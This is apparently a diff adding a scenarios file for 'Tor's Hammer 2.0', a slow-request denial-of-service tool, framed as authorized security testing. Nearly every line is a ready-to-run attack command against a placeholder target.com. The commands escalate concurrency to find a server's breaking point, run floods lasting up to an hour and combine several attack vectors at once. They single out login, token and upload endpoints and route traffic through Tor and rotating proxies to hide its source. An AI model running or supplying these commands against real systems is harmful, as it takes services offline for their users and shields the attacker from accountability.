@@ -1,0 +1,123 @@
+# Testing Scenarios for Tor's Hammer 2.0
+# =======================================
+# This file contains pre-configured testing scenarios for different
+# security assessment needs. Copy and modify these commands for your
+# authorized testing requirements.
+
+# DISCOVERY SCENARIOS
+# ===================
+
+# Scenario 1: Initial vulnerability discovery
+# Test all modes with low concurrency to identify which attack vectors work
+torshammer -u http://target.com -m slow-post -c 64 -d 30
+torshammer -u http://target.com -m slow-headers -c 64 -d 30
+torshammer -u http://target.com -m slow-read -c 64 -d 30
+torshammer -u http://target.com -m chunked -c 64 -d 30
+
+# Scenario 2: Port/service discovery
+# Test different ports/services on the same host
+torshammer -u http://target.com:80 -c 128 -d 30
+torshammer -u http://target.com:8080 -c 128 -d 30
+torshammer -u https://target.com:443 -c 128 -d 30
+
+# ASSESSMENT SCENARIOS
+# ====================
+
+# Scenario 3: Capacity assessment
+# Gradually increase concurrency to find the breaking point
+torshammer -u http://target.com -c 128 -d 60
+torshammer -u http://target.com -c 256 -d 60
+torshammer -u http://target.com -c 512 -d 60
+torshammer -u http://target.com -c 1024 -d 60
+
+# Scenario 4: Duration testing
+# Test if the target can sustain prolonged attacks
+torshammer -u http://target.com -c 256 -d 300    # 5 minutes
+torshammer -u http://target.com -c 256 -d 1800   # 30 minutes
+
+# Scenario 5: Timing optimization
+# Test different timing delays to find optimal configuration
+torshammer -u http://target.com -dl 0.1 -dh 1.0 -c 256 -d 60   # Fast
+torshammer -u http://target.com -dl 0.5 -dh 3.0 -c 256 -d 60   # Medium
+torshammer -u http://target.com -dl 1.0 -dh 5.0 -c 256 -d 60   # Slow
+
+# MITIGATION VALIDATION SCENARIOS
+# ================================
+
+# Scenario 6: WAF testing
+# Test if WAF/IPS detects and blocks slow-requests attacks
+torshammer -u http://target.com -c 512 -d 120 --user-agents user-agents.txt
+
+# Scenario 7: Rate limiting validation
+# Test if rate limiting effectively throttles the attack
+torshammer -u http://target.com -c 1024 -d 180
+
+# Scenario 8: Timeout configuration validation
+# Test if server timeouts are properly configured
+torshammer -u http://target.com -m slow-headers -dl 2.0 -dh 10.0 -c 256 -d 120
+
+# ANONYMIZED TESTING SCENARIOS
+# =============================
+
+# Scenario 9: Tor anonymization
+# Test through Tor for privacy
+torshammer -u http://target.com --tor -c 128 -d 60
+
+# Scenario 10: Proxy rotation
+# Distribute across multiple proxies
+torshammer -u http://target.com --proxy-list proxies.txt --rotate-proxies -c 512 -d 120
+
+# Scenario 11: Combined anonymization
+# Use Tor with custom User-Agent rotation
+torshammer -u http://target.com --tor --user-agents user-agents.txt -c 256 -d 60
+
+# COMPREHENSIVE ASSESSMENT SCENARIOS
+# ===================================
+
+# Scenario 12: Full assessment with logging
+# Comprehensive test with JSON logging for analysis
+torshammer -u http://target.com \
+    -m slow-headers \
+    -c 512 \
+    -d 300 \
+    --user-agents user-agents.txt \
+    --json > assessment_results.json
+
+# Scenario 13: Multi-vector attack
+# Test multiple attack vectors simultaneously
+torshammer -u http://target.com -m slow-post -c 256 -d 120 &
+torshammer -u http://target.com -m slow-headers -c 256 -d 120 &
+torshammer -u http://target.com -m slow-read -c 256 -d 120 &
+wait
+
+# Scenario 14: Endurance testing
+# Long-duration test to check system stability
+torshammer -u http://target.com -c 384 -d 3600 --json > endurance_test.json
+
+# SPECIFIC ENDPOINT SCENARIOS
+# ============================
+
+# Scenario 15: API endpoint testing
+# Test API endpoints that might be more vulnerable
+torshammer -u http://target.com/api/login -m slow-post -c 256 -d 60
+torshammer -u http://target.com/api/upload -m slow-post -c 256 -d 60
+torshammer -u http://target.com/api/search -m slow-read -c 256 -d 60
+
+# Scenario 16: Authentication endpoint testing
+# Test authentication endpoints (often high-value targets)
+torshammer -u https://target.com/auth/login -m slow-headers -c 128 -d 60 --ssl-no-verify
+torshammer -u https://target.com/auth/token -m slow-post -c 128 -d 60 --ssl-no-verify
+
+# Scenario 17: File upload endpoint testing
+# Test file upload endpoints (often resource-intensive)
+torshammer -u http://target.com/upload -m slow-post --post-length 8192 -c 128 -d 60
+
+# USAGE NOTES
+# ===========
+# 1. Always replace "target.com" with your authorized target
+# 2. Adjust concurrency (-c) based on target capacity
+# 3. Use appropriate duration (-d) for your testing needs
+# 4. Monitor target health during testing
+# 5. Save results with --json for post-test analysis
+# 6. Use -q for quiet mode in automated scripts
+# 7. Start with lower concurrency and increase gradually
